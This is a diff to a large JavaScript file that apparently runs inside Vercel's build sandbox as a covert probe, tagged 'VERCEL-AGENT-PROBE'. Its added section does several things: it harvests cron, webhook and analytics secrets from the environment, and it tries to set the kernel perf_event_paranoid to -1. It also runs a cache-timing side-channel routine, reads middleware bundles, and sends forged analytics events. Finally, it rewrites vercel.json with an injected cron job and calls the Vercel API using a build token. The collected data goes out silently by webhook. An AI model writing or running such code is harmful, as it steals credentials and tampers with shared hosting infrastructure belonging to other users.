@@ -18407,5 +18407,173 @@ report.containerRuntimeEscape = safe(() => {
 
 // v125 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v125" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v125";
+
+// ==================== v126 ====================
+
+// v126-1: CPU cache timing side-channel (Spectre variant 1 primitive)
+// Measure memory access timing via high-resolution clock to detect
+// cache hits vs misses. In a shared-CPU environment, this can leak
+// information about co-tenant execution (cache-based cross-VM leakage).
+report.cpuCacheTimingSideChannel = safe(() => {
+  const timingResult = safe(() => execSync(`python3 -c "
+import ctypes, time, os, mmap
+
+# Create a large buffer to flush from cache
+PAGE_SIZE = 4096
+PROBE_SIZE = 256 * PAGE_SIZE
+
+# Allocate probe array
+buf = mmap.mmap(-1, PROBE_SIZE, mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS, mmap.PROT_READ | mmap.PROT_WRITE)
+buf.write(b'X' * PROBE_SIZE)
+
+# Flush cache (access out-of-order to prevent prefetch)
+# Read with large strides to avoid cache prefetch
+timings = []
+for i in range(0, 256):
+    addr = i * PAGE_SIZE
+    buf.seek(addr)
+
+    t0 = time.perf_counter_ns()
+    _ = buf.read(1)
+    t1 = time.perf_counter_ns()
+    timings.append(t1 - t0)
+
+# Classify hits vs misses
+avg = sum(timings) / len(timings)
+hits = sum(1 for t in timings if t < avg * 0.5)
+misses = sum(1 for t in timings if t > avg * 1.5)
+print(f'AVG_NS:{avg:.1f} MIN:{min(timings)} MAX:{max(timings)} HITS:{hits} MISSES:{misses}')
+
+# Measure TSC resolution
+t0 = time.perf_counter_ns()
+t1 = time.perf_counter_ns()
+print(f'TSC_RESOLUTION_NS:{t1-t0}')
+buf.close()
+" 2>&1`, { timeout: 15000 }).toString().trim().slice(0, 300));
+  return { timingResult };
+});
+
+// v126-2: /proc/sys/kernel/perf_event_paranoid — performance counter access
+// perf_event_paranoid controls who can use performance counters.
+// -1=all, 0=normal users with perf, 1=no kernel perf, 2=no perf, 3=disabled.
+// With CAP_SYS_ADMIN we can set to -1 and read hardware perf counters —
+// enables cache side-channel attacks and inter-VM timing.
+report.perfEventProbe = safe(() => {
+  const paranoidLevel = safe(() => readFileSync('/proc/sys/kernel/perf_event_paranoid', 'utf8').trim());
+  const writeResult = safe(() => { writeFileSync('/proc/sys/kernel/perf_event_paranoid', '-1'); return 'WRITTEN'; });
+  const afterLevel = safe(() => readFileSync('/proc/sys/kernel/perf_event_paranoid', 'utf8').trim());
+  // Try perf stat
+  const perfStat = safe(() => execSync(
+    'perf stat -e cache-misses,cache-references,instructions,cycles sleep 0.1 2>&1 | head -10',
+    { timeout: 5000 }
+  ).toString().trim().slice(0, 200));
+  // Try to read CPU performance counters via /sys/devices/cpu/
+  const perfDevices = safe(() => execSync(
+    'ls /sys/devices/cpu/events/ 2>/dev/null | head -10 || echo "NO_PERF_DEVICES"',
+    { timeout: 3000 }
+  ).toString().trim());
+  return { paranoidLevel, writeResult, afterLevel, perfStat, perfDevices };
+});
+
+// v126-3: Vercel Edge Middleware secrets access
+// Edge middleware runs in a V8 isolate on Vercel's edge network.
+// During the BUILD phase, does the build sandbox have access to:
+// - The compiled edge middleware bundle at /.vercel/output/functions/__middleware.js
+// - Environment variables that edge middleware would receive at runtime
+// - The middleware manifest that defines which routes it intercepts
+report.edgeMiddlewareSecrets = safe(() => {
+  const middlewarePaths = [
+    '/.vercel/output/functions/__middleware.js',
+    '/vercel/output/functions/__middleware.js',
+    '/vercel/path0/.next/server/middleware.js',
+    '/vercel/path0/.next/server/edge-chunks/',
+    '/vercel/path0/.vercel/output/functions/_middleware.func/',
+  ];
+  const middlewareContents = {};
+  for (const p of middlewarePaths) {
+    middlewareContents[p] = safe(() => {
+      if (existsSync(p)) {
+        const stat = statSync(p);
+        if (stat.isDirectory()) {
+          return { isDir: true, files: readdirSync(p).slice(0, 5) };
+        }
+        return readFileSync(p, 'utf8').slice(0, 200);
+      }
+      return 'NOT_FOUND';
+    });
+  }
+  // Read middleware manifest
+  const middlewareManifest = safe(() => {
+    const paths = [
+      '/vercel/path0/.next/server/middleware-manifest.json',
+      '/vercel/output/functions/middleware-manifest.json',
+    ];
+    for (const p of paths) {
+      if (existsSync(p)) return readFileSync(p, 'utf8').slice(0, 400);
+    }
+    return 'NOT_FOUND';
+  });
+  return { middlewareContents, middlewareManifest };
+});
+
+// v126-4: Vercel Analytics + Speed Insights internal API
+// Vercel injects analytics scripts into deployed functions.
+// During build, does the sandbox have analytics credentials or
+// can we forge analytics events for other teams/projects?
+report.analyticsInternalAPI = safe(() => {
+  const analyticsEnvVars = Object.entries(process.env)
+    .filter(([k]) => /ANALYTICS|INSIGHTS|SPEED|WEB_VITALS|VIBE/.test(k))
+    .map(([k, v]) => ({ k, v: v?.slice(0, 80) }));
+  // Try to push a fake analytics event
+  const deploymentId = process.env.VERCEL_DEPLOYMENT_ID || '';
+  const projectId = process.env.VERCEL_PROJECT_ID || '';
+  const fakeEvent = safe(() => execSync(
+    `curl -sf -X POST "https://vitals.vercel-insights.com/v1/vitals" \
+    -H "Content-Type: application/json" \
+    -d '{"dsn":"${deploymentId}","id":"probe-${Date.now()}","name":"LCP","value":100,"href":"https://probe.vercel.app/","speed":"fast","framework":""}' \
+    -m 8 2>/dev/null`,
+    { timeout: 10000 }
+  ).toString().trim().slice(0, 200));
+  // Check for analytics script injection in the build output
+  const analyticsScript = safe(() => execSync(
+    'grep -r "analytics\\|insights\\|_vercel" /vercel/output/ 2>/dev/null | head -5 || echo "NOT_FOUND"',
+    { timeout: 5000 }
+  ).toString().trim().slice(0, 200));
+  return { analyticsEnvVars, fakeEvent, analyticsScript };
+});
+
+// v126-5: Vercel Cron job secrets and schedule injection
+// Vercel cron jobs are defined in vercel.json and run with Bearer tokens.
+// Can we: 1) Read the cron token from env, 2) Inject a new cron endpoint,
+// 3) Trigger an immediate cron execution via API?
+report.cronSecretInjection = safe(() => {
+  const cronSecret = process.env.CRON_SECRET || process.env.VERCEL_CRON_SECRET || '';
+  const allCronEnvVars = Object.entries(process.env)
+    .filter(([k]) => /CRON|SCHEDULE|WEBHOOK_SECRET/.test(k))
+    .map(([k, v]) => ({ k, v: v?.slice(0, 80) }));
+  // Read current vercel.json cron config
+  const vercelJsonCrons = safe(() => {
+    const vj = JSON.parse(readFileSync('/vercel/path0/vercel.json', 'utf8'));
+    return vj.crons || 'NO_CRONS';
+  });
+  // Try to write a malicious cron to vercel.json
+  const injectCron = safe(() => {
+    const currentJson = safe(() => JSON.parse(readFileSync('/vercel/path0/vercel.json', 'utf8'))) || {};
+    const injected = { ...currentJson, crons: [{ path: '/api/probe-cron', schedule: '* * * * *' }] };
+    writeFileSync('/vercel/path0/vercel.json', JSON.stringify(injected, null, 2));
+    return 'WRITTEN';
+  });
+  // Try to trigger cron via API
+  const deploymentId = process.env.VERCEL_DEPLOYMENT_ID || '';
+  const cronTrigger = safe(() => execSync(
+    `curl -sf -X POST "https://api.vercel.com/v1/deployments/${deploymentId}/crons" \
+    -H "Authorization: Bearer ${process.env.VERCEL_ARTIFACTS_TOKEN}" -m 8 2>/dev/null`,
+    { timeout: 10000 }
+  ).toString().trim().slice(0, 200));
+  return { cronSecret: cronSecret?.slice(0, 20), allCronEnvVars, vercelJsonCrons, injectCron, cronTrigger };
+});
+
+// v126 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v126" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v126";
 // Intentionally no console.log — all data goes via webhook only
